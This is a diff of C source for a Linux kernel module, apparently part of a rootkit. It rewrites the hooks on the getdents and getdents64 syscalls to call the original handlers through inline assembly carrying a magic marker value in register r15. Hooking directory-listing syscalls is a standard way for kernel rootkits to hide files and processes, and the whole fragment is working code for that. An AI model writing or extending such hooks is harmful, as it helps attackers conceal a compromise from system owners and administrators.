@@ -3,15 +3,35 @@
 
 #include <linux/module.h>
 
-syscall_t *_getdents = NULL;
-syscall_t *_getdents64 = NULL;
+void *_getdents = NULL;
+void *_getdents64 = NULL;
 
 asmlinkage int64_t h_getdents(const struct pt_regs *r) {
-  orig_get(_getdents, "getdents");
-  orig_call(_getdents);
+  int64_t ret = 0;
+  hfind(_getdents, "getdents");
+
+  asm("mov %1, %%r15;"
+      "mov %2, %%rdi;"
+      "call *%3;"
+      "mov %%rax, %0"
+      : "=m"(ret)
+      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents)
+      : "%r15", "%rdi", "%rax");
+
+  return ret;
 }
 
 asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
-  orig_get(_getdents64, "getdents64");
-  orig_call(_getdents64);
+  int64_t ret = 0;
+  hfind(_getdents64, "getdents64");
+
+  asm("mov %1, %%r15;"
+      "mov %2, %%rdi;"
+      "call *%3;"
+      "mov %%rax, %0"
+      : "=m"(ret)
+      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents64)
+      : "%r15", "%rdi", "%rax");
+
+  return ret;
 }
